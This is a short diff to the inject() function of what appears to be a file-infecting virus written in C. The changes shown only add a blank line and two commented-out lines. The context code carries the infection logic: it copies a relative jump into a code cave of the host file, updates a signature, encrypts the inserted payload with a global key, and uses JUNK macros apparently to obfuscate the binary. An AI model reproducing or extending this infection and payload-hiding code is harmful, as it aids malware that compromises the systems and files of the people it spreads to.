@@ -158,6 +158,7 @@ static int	inject(data_t *data) {
 		return 1;
 	} JUNK;
 
+
 	update_signature(data);
 
 	uint16_t jmp_offset		= (uintptr_t)&jmp_end - (uintptr_t)&_start + 1;
@@ -175,6 +176,9 @@ static int	inject(data_t *data) {
 	ft_memcpy(data->file + data->cave.offset + jmp_offset, &data->cave.rel_jmp, JMP_SIZE); JUNK;
 
 	encrypt(data->file + data->cave.offset + real_start_off, PAYLOAD_SIZE, g_key);
+
+	//data->algo_vars.data = data->file + data->cave.offset + real_start_off;
+	//data->algo_vars.size = PAYLOAD_SIZE;
 
 	return 0;
 }
